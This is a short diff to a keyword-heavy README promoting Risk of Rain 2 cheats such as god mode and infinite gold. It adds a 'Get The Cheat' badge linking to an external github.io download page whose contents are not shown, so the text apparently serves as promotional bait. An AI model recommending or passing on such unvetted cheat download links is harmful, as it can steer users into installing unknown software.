@@ -4,6 +4,7 @@
 
 **Risk of Rain 2** is a chaotic roguelike where enemies scale infinitely, and survival depends on quick farming and smart item choices. While many enjoy the challenge, others use **Risk of Rain 2 cheats** to remove grind and push the game’s limits. From **god mode** and **infinite gold** to **item spawners and XP hacks**, cheats open up new ways to experiment and dominate runs.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://risk-of-rain-2-cheat.github.io/.github/)
 ---
 
 ## What Are Risk of Rain 2 Cheats?
